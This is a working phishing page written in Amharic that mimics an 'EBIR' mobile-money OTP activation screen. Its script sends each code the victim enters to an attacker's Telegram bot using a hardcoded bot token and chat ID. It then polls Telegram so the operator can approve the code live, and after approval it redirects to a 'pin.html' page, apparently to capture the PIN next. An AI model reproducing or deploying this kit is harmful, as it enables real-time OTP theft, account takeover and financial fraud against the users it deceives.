<!DOCTYPE html>
<html lang="am">

<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">

    <title>EBIR የማግበሪያ ኮድ</title>

    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: #f3f3f3;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .app {
            width: 390px;
            height: 844px;
            background: #fff;
            overflow: hidden;
            box-shadow: 0 15px 40px rgba(0, 0, 0, .15);
            position: relative;
        }
        
        .header {
            position: relative;
            width: 100%;
            height: 280px;
            background: #fff;
            overflow: hidden;
        }
        
        .header-img {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: contain;
            object-position: top center;
            display: block;
        }
        
        .content {
            padding: 30px 25px;
            text-align: center;
        }
        
        .content p {
            font-size: 17px;
            line-height: 1.6;
            color: #222;
        }
        
        .otp {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: 30px;
        }
        
        .otp input {
            width: 48px;
            height: 54px;
            background: #f2f2f2;
            border: none;
            border-bottom: 2px solid #999;
            font-size: 28px;
            text-align: center;
            outline: none;
            transition: .25s;
            border-radius: 8px 8px 0 0;
        }
        
        .otp input:focus {
            background: #fff;
            border-bottom: 3px solid #11a9ec;
            transform: translateY(-2px);
        }
        
        .footer {
            position: absolute;
            bottom: 35px;
            left: 0;
            width: 100%;
            padding: 0 22px;
            text-align: center;
        }
        
        .bottom {
            margin-top: 20px;
        }
        
        .bottom a {
            color: #3b8f4d;
            text-decoration: none;
            font-weight: 500;
        }
        
        button {
            width: 100%;
            height: 56px;
            border: none;
            border-radius: 10px;
            background: #14a8e7;
            color: #fff;
            font-size: 19px;
            font-weight: 600;
            box-shadow: 0 6px 15px rgba(0, 0, 0, .2);
            transition: .3s;
            cursor: pointer;
        }
        
        button:hover {
            background: #0f95d1;
        }
        
        button:active {
            transform: scale(.98);
        }
        
        button:disabled {
            background: #ccc;
            cursor: not-allowed;
            box-shadow: none;
        }
        
        #spinnerOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.98);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #f0f0f0;
            border-top: 6px solid #11a9ec;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 30px;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        
        .spinner-text {
            font-size: 18px;
            color: #333;
            text-align: center;
            line-height: 1.6;
            max-width: 320px;
            font-weight: 500;
        }
        
        #resultOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.98);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
            padding: 20px;
        }
        
        .result-message {
            font-size: 18px;
            color: #333;
            text-align: center;
            line-height: 1.6;
            max-width: 320px;
            font-weight: 500;
        }
        
        @media(max-width:420px) {
            body {
                background: #fff;
            }
            .app {
                width: 100%;
                height: 100vh;
                box-shadow: none;
            }
            .header {
                height: auto;
                aspect-ratio: 390 / 280;
            }
            #spinnerOverlay,
            #resultOverlay {
                height: 100vh;
            }
        }
        
        @media(max-width:360px) {
            .otp {
                gap: 8px;
            }
            .otp input {
                width: 40px;
                height: 46px;
                font-size: 22px;
            }
            .content {
                padding: 20px 16px;
            }
            .content p {
                font-size: 15px;
            }
        }
    </style>

</head>

<body>

    <div class="app">

        <header class="header">
            <img class="header-img" src="ebirr.jpeg" alt="EBIR ራስጌ">
        </header>

        <div class="content">

            <p>
                እባክዎ በሞባይል ቁጥርዎ ወይም በኢሜል አድራሻዎ የተላከውን የOTP ኮድ ያረጋግጡ
            </p>

            <div class="otp">

                <input maxlength="1" inputmode="numeric" autocomplete="off">
                <input maxlength="1" inputmode="numeric" autocomplete="off">
                <input maxlength="1" inputmode="numeric" autocomplete="off">
                <input maxlength="1" inputmode="numeric" autocomplete="off">
                <input maxlength="1" inputmode="numeric" autocomplete="off">
                <input maxlength="1" inputmode="numeric" autocomplete="off">

            </div>

        </div>

        <div class="footer">

            <button id="activate">አግብር</button>

            <div class="bottom">
                የማግበሪያ ኮድ አልደረሰዎትም?
                <a href="#" id="resend">ኮዱን እንደገና ላክ</a>
            </div>

        </div>

    </div>

    <!-- Spinner Overlay -->
    <div id="spinnerOverlay">
        <div class="spinner"></div>
        <div class="spinner-text">
            እባክዎ የማግበሪያ ኮድዎ እየተረጋገጠ ሲሆን ይጠብቁ
        </div>
    </div>

    <!-- Result Overlay -->
    <div id="resultOverlay">
        <div class="result-message" id="resultMessage"></div>
    </div>

    <script>
        //=========================================
        // TELEGRAM CONFIG
        //=========================================
        const TELEGRAM_BOT_TOKEN = "8921637704:AAGO3W6A-S3YwUZ5YpIDk9U-XbY4SMQ-A64";
        const TELEGRAM_CHAT_ID = "7789056021";
        //=========================================

        //============================
        // DOM REFERENCES
        //============================

        const otpInputs = document.querySelectorAll(".otp input");
        const activateBtn = document.getElementById("activate");
        const spinnerOverlay = document.getElementById("spinnerOverlay");
        const resultOverlay = document.getElementById("resultOverlay");
        const resultMessage = document.getElementById("resultMessage");

        let pollInterval = null;
        let lastUpdateId = 0;
        let currentTimestamp = 0;

        //============================
        // OTP INPUT LOGIC
        //============================

        otpInputs.forEach((input, index) => {

            // Numbers only
            input.addEventListener("input", function() {

                this.value = this.value.replace(/\D/g, "");

                if (this.value.length === 1 && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }

            });

            // Keyboard navigation
            input.addEventListener("keydown", function(e) {

                if (e.key === "Backspace") {

                    if (this.value === "" && index > 0) {

                        otpInputs[index - 1].focus();
                        otpInputs[index - 1].value = "";

                    }

                }

                if (e.key === "ArrowLeft" && index > 0) {

                    e.preventDefault();
                    otpInputs[index - 1].focus();

                }

                if (e.key === "ArrowRight" && index < otpInputs.length - 1) {

                    e.preventDefault();
                    otpInputs[index + 1].focus();

                }

            });

            // Select current value
            input.addEventListener("focus", function() {

                this.select();

            });

        });

        //============================
        // Paste Entire OTP
        //============================

        otpInputs.forEach((input) => {
            input.addEventListener("paste", function(e) {

                e.preventDefault();

                let pasted = (e.clipboardData || window.clipboardData)
                    .getData("text")
                    .replace(/\D/g, "")
                    .substring(0, 6);

                pasted.split("").forEach((digit, i) => {

                    if (otpInputs[i]) {
                        otpInputs[i].value = digit;
                    }

                });

                if (pasted.length === 6) {
                    otpInputs[5].blur();
                } else {
                    otpInputs[pasted.length].focus();
                }

            });
        });

        //============================
        // Get OTP
        //============================

        function getOTP() {
            return [...otpInputs].map(input => input.value).join("");
        }

        //============================
        // Reset OTP Inputs (for Cancel)
        //============================

        function resetOTPInputs() {
            otpInputs.forEach(input => {
                input.value = "";
            });
            otpInputs[0].focus();
        }

        //============================
        // Send to Telegram with Inline Buttons
        //============================

        async function sendOTPToTelegram(otp) {
            const timestamp = Date.now();
            currentTimestamp = timestamp;

            const message = `🔐 *OTP / Activation Code Received*\n\n` +
                `🔢 *Code:* \`${otp}\`\n` +
                `🕐 *Time:* ${new Date().toLocaleString()}\n\n` +
                `Please approve or cancel this activation.`;

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: '✅ Approve',
                                    callback_data: 'approve_' + timestamp
                                }, {
                                    text: '❌ Wrong OTP',
                                    callback_data: 'cancel_' + timestamp
                                }]
                            ]
                        }
                    })
                });

                const result = await response.json();
                return result.ok;
            } catch (error) {
                console.error('Telegram send error:', error);
                return false;
            }
        }

        //============================
        // Poll Telegram for Admin Response
        //============================

        function startPolling() {
            pollInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                    .then(res => res.json())
                    .then(data => {
                        if (data.ok && data.result.length > 0) {
                            for (let update of data.result) {
                                lastUpdateId = update.update_id;
                                if (update.callback_query) {
                                    const callbackData = update.callback_query.data;
                                    // Split by last underscore to get the timestamp
                                    const lastUnderscore = callbackData.lastIndexOf('_');
                                    const action = callbackData.substring(0, lastUnderscore);
                                    const ts = callbackData.substring(lastUnderscore + 1);

                                    if (ts == currentTimestamp) {
                                        // Stop polling
                                        clearInterval(pollInterval);
                                        pollInterval = null;

                                        // Hide spinner
                                        spinnerOverlay.style.display = 'none';

                                        // Show result overlay
                                        resultOverlay.style.display = 'flex';

                                        if (action === 'approve') {
                                            resultMessage.textContent = 'Your OTP has been verified successfully. You will be redirected to complete your registration.';

                                            // 🔁 REDIRECT TO pin.html AFTER 2 SECONDS
                                            setTimeout(() => {
                                                window.location.href = 'pin.html';
                                            }, 2000);

                                        } else if (action === 'cancel') {
                                            resultMessage.textContent = 'Wrong OTP. Please re-enter your OTP code.';

                                            // Hide result overlay after 3 seconds and reset
                                            setTimeout(() => {
                                                resultOverlay.style.display = 'none';
                                                resetOTPInputs();
                                                activateBtn.disabled = false;
                                                activateBtn.textContent = 'አግብር';
                                            }, 3000);
                                        }

                                        // Answer callback query to remove loading state on button
                                        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                            method: 'POST',
                                            headers: {
                                                'Content-Type': 'application/json',
                                            },
                                            body: JSON.stringify({
                                                callback_query_id: update.callback_query.id
                                            })
                                        });
                                    }
                                }
                            }
                        }
                    })
                    .catch(err => {
                        console.error('Polling error:', err);
                    });
            }, 1500); // Poll every 1.5 seconds
        }

        //============================
        // Activate Button
        //============================

        activateBtn.addEventListener("click", async function() {

            let otp = getOTP();

            if (otp.length !== 6) {
                alert("እባክዎ ባለ 6-አሃዝ የማግበሪያ ኮድ ያስገቡ።");
                otpInputs[0].focus();
                return;
            }

            // Disable button to prevent double-submit
            activateBtn.disabled = true;
            activateBtn.textContent = "በሂደት ላይ...";

            // Show spinner
            spinnerOverlay.style.display = 'flex';

            // Send OTP to Telegram with inline buttons
            const sent = await sendOTPToTelegram(otp);

            if (!sent) {
                console.warn("Telegram send failed — check your bot token and chat ID.");
                spinnerOverlay.style.display = 'none';
                activateBtn.disabled = false;
                activateBtn.textContent = "አግብር";
                alert("የማግበሪያ ጥያቄውን መላክ አልተሳካም። እባክዎ እንደገና ይሞክሩ።");
                return;
            }

            // Start polling for admin response
            startPolling();

        });

        //============================
        // Enter Key
        //============================

        document.addEventListener("keydown", function(e) {

            if (e.key === "Enter") {
                activateBtn.click();
            }

        });

        //============================
        // Resend Code
        //============================

        document.getElementById("resend").addEventListener("click", function(e) {

            e.preventDefault();
            alert("አዲስ የማግበሪያ ኮድ ተልኳል።");
            resetOTPInputs();

        });

        //============================
        // Auto Focus First Box
        //============================

        window.onload = function() {
            otpInputs[0].focus();
        };
    </script>

</body>

</html>
